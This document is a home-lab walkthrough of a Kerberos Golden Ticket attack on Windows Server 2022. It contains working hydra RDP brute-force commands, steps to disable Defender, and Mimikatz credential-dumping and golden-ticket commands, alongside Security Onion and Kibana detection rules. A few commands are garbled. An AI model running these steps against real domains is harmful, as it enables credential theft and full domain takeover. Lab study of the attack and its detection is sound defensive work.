# Golden Ticket Attack
- This will show you how to perform a Golden Ticket Attack

## Configuring a vulnerable user in Windows Server 2022
- On Windows Server 2022, enable Remote Desktop Settings
- On CMD, type in net user sally password /add /domain (This will make their password as password)
- This will be classified as Common Weakness Enumeration 521 Weak Password Requirements
- Now make sure sally has remote access privileges by clicking on the start button, click System, then click on Remote Desktop, under User accounts click on Select users that can remotely access this PC, then click on sally, if sally is not there, click on add, then click on Advanced button, under Common Queries type in sally in the name text box, and then click on find, double click on her name and then click on ok
- Now add Allow logon through Remote Desktop Service by clicking on the search bar on the bottom left, type in gpedit.msc and then under Computer Configuration click on Windows Settings, Security Settings, Local Policies and then on User Rights Assignment, click on Allow logon through Remote Desktop Services, here you will edit the allowed users to be domain admins, local admins, IT admins and Sally by clicking on the Add Users or Group button
- You will do the same for Allow log on locally Policy under User Rights Assignment
- Do a right click on Default Domain Policy on the Group Policy Management Window and click on Enforce

## Reconnaissance and Gaining Access with a remote brute force
- Perform another Nmap scan with the command Nmap -A <Kali Linux IP address>, the results should be similar to those from before, now also showing port 3389 for Remote Desktop Protocal
- Type in the command gunzip rockyou.txt.gz to unzio the rockyou.txt file if you haven't yet
- Now you will perform a remote brute force attack against sally account
- In a terminal type in hydra -t 1 -V -f -l sally -P /usr/share/wordlists/rockyou.txt <Windows Server 2022 IP address> rdp
- You will find a password in the output
- Go back to Security Onion 2 dashboard, you will see under detections ET INFO RDP - Response To External Host, this indicates successful RDP activity
- You will do a similar scan against the administrator account
- Type in the following command in terminal hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt <Windows Server 2022 IP address> rdp
- Go back to Security Onion 2 under detections, you will see ET REMOTE_ACCESS MS Remote Desktop Administrator Login Request, ET SCAN Behavioral Unusually fast Terminal Server Traffic Potential Scan or Infection (Outbound), and ET SCAN Behavioral Unusually fast Terminal Server Traffic Potential Scan or Infection (Inbound)
- You can click on the arrow icon and drill down on the security generated report and reveal the IP address of the attacker
- You can make a rule in Kibana by clicking rules under security, then click on Detection rule (SIEM), click on Create new rule button, click on Custom query, under Custom query type in <Kali Linux Virtula Machine IP address> AND event.dataset: system.security, click next, give it a name and description of what the rule does, click on continue, and then click on continue again, and click on Create & enable rule

# Enabling more rules to the Elastic Agent installed on Windows Server 2022
- This file will teach you how to enable more rules under the Elastic Agent policy

## Enabling more rules for Elastic Agent to detect
- Go back to Kibana and click on Alerts under the Security section, then click on the Manage rules button, then click on the Disabled rules button, you will see all of the rules that are disabled, click on the check box to select as many rules that you can and then click on Bulk action, then click on Enable to enable the selected rules
- Now all of these rules will be monitoring the Server 2022 Virtual Machine

# Using Mimikatz to get the Golden Ticket
- In your Kali Linux virtual machine, open a terminal and type in the following command sudo apt update && sudo apt upgrade
- This command will update Kali Linux Virtual Machine
- Back on the Security Onion 2 dashboard, under detections you will see ET INFO [eSentire] Possible Kali Linux Updates, this will be a true positive detection, it refers to an internal asset on the network trying to communicate with official kali linux package repositories or update mirrors to perform a system update or fetch software packages

## Using Remote Desktop Protocol
- Open up a terminal in your Kali Linux virtual machine
- To install Remmina which is RDP but for Kali Linux, so that you can access the Windows 2022 RDP through sally credential that was just harvested, type in the following command sudo apt install remmina
- After the update is done you will run Remmina, type in the following command remmina -c rdp://sally:password@<Windows Server 2022 IP address>
- Now you have access to the victim's account with valid credentials on a rogue remote session

## Installing Mimikatz and running Mimikatz
- Next you will get the Golden Ticket via Mimikatz, Mimikatz falls under many different sub-techniques according to MITRE ATT&CK
- According to MITRE ATT&CK, Mimikatz is a credential dumper capable of obtaining plaintext Windows account logins and password
- Using Edge go to https://github.com/gentilkiwi/mimikatz/releases on your Windows Server 2022 virtual machine to download Mimikatz and unzip the zipped file
- You will get many errors and notifications from Edge or Defender
- Go to Windows Virus & Threat Protection by clicking on the search bar and typing Settings in the search bar, click on Windows Security, then click on Virus & threat protection and then click on Manage settings under Virus & threat protection settings
- Turn off Real-time protection and all of the other protection that are turned on (This will mimic potential misconfiguration by the sysadmin and disorder as some assume that another EDR or antimalware is in place)
- Switch to another account by clicking on the start button on the button left side, click on the user icon and then click on Switch Profile
- On the login screen type in sally as the user and then type in password for the password
- Try the download again, you might need to turn off the Windows Defender like you did with the other account, once you download Mimikatz, you will see Defender notification pop-up on the bottom right, you will see things like mimispool.dll, mimilib.dll, mimikatze.exe, mimidrv.sys, and mimilove.exe
- Next right click on Mimikatze.exe and Run As Administrator to launch the program
- Next type in the following command into the CMD that popped up: Username=.\sally AND Password=password (This falls under MITRE ATT&CK Credential Access (TA0006) for credential dumping and Privilege Escalation for escalating access to admin)
- Go back to Kibana and under Alerts under the Security section, you will see security alerts and you will see Malware Detection Alert generated
- Next type in the following command to get the highest privileges on a Windows System, the command is privilege::debug
- The next command will dump all the password hashes and credentials of logged-on users including the administrator, the command is sekurlsa::logonpasswords
- Copy and paste the output on a text file, look for the administrator's NTLM hash, you will use this hash to gain full local and domain admin privileges
- Next you will type in the next command lsadump::lsa /inject /name:krbtgt, this command will dump the highest privileged account in an active directory domain which will be the KRBTGT account
- This account signs all the Kerberos tickets in the domain, its password is under Primary NTLM, you will use that to get the Golden Ticket
- Type in the next command to do so Kerberos::golden /domain.cs.org /sid:<administrator SID from sekurlsa command> /rc4:<NTLM hash of KRBTGT> /user:Administrator /id:500 /ptt
- You will see Golden Ticket for Administrator @ cs.org' successfully submitted for current session
- This means that you have successfully received the Golden Ticket and can now impersonate or create any user on the domain and have full domain control
- This is a technique known as Credential Access tactic under MITRE ATT&CK

# Creating a rule to detect Mimikatz
- Go to Kibana rule and create a rule under custom query, type in the following wildcard query *mimikatz*, for timeline select Comprehensive process timeline , give it a name and set the severity to High, set the rule to run every minute and look back one minute
- This will catch all instances of Mimikatz

